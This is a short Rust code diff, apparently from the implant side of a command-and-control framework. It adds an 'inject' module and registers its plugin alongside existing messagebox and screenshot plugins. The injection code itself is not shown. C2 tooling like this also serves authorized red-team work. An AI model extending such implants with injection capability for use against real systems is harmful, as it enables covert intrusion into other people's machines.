@@ -10,11 +10,13 @@ use chamuko_protocol::{AgentInfo, Task, TaskResult};
 
 mod client;
 mod commands;
+mod inject;
 mod messagebox;
 mod screenshot;
 
 use client::{C2Client, C2Error};
 use commands::core_plugin;
+use inject::inject_plugin;
 use messagebox::messagebox_plugin;
 use screenshot::ScreenshotPlugin;
 
@@ -387,6 +389,10 @@ fn main() -> ExitCode {
     let config = Config::from_args();
 
     let mut registry = PluginRegistry::new();
+    if let Err(e) = registry.register(Box::new(inject_plugin())) {
+        eprintln!("failed to register inject plugin: {e}");
+        return ExitCode::FAILURE;
+    }
     if let Err(e) = registry.register(Box::new(messagebox_plugin())) {
         eprintln!("failed to register messagebox plugin: {e}");
         return ExitCode::FAILURE;
